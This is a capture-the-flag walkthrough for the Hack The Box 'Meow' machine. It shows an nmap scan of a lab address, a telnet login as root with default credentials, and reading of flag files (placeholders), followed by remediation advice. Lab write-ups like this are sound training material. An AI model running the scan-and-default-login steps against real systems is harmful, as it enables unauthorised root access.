# Hack The Box: Meow Walkthrough

![HTB Badge](https://img.shields.io/badge/HTB-Meow-ff0000?style=flat-square)
![Difficulty-Easy](https://img.shields.io/badge/Difficulty-Very_Easy-green?style=flat-square)
![OS-Linux](https://img.shields.io/badge/OS-Linux-orange?style=flat-square)

---

## Challenge Overview

| Item | Details |
|------|---------|
| **Name** | Meow |
| **Platform** | Hack The Box |
| **OS** | Linux |
| **Difficulty** | Very Easy |

---

## Enumeration

### Nmap Scan

```bash
nmap -sC -sV -oA meow 10.10.10.45
```

**Results:**
```
PORT   STATE SERVICE
23/tcp open  telnet
```

---

## Access

### Telnet Connection

```bash
telnet 10.10.10.45
```

**Credentials found in banner:**
- User: `root`
- Password: `password`

---

## Getting the Flags

```bash
root@Meow:~# cat user.txt
HTB{user_flag_here}

root@Meow:~# cat /root/root.txt
HTB{root_flag_here}
```

---

## Solution

Simply connect via telnet with default credentials:
- Username: `root`
- Password: `password`

This is a beginner-friendly box teaching basic telnet access and default password vulnerabilities.

---

## Flags

### User Flag
```
HTB{user_flag_here}
```

### Root Flag
```
HTB{root_flag_here}
```

---

## Remediation

1. Disable Telnet - use SSH instead
2. Change default passwords
3. Disable root login
4. Use key-based authentication

---

**Author:** Sheldon Brown (Bossman Shell)

> ⚠️ Educational purposes only
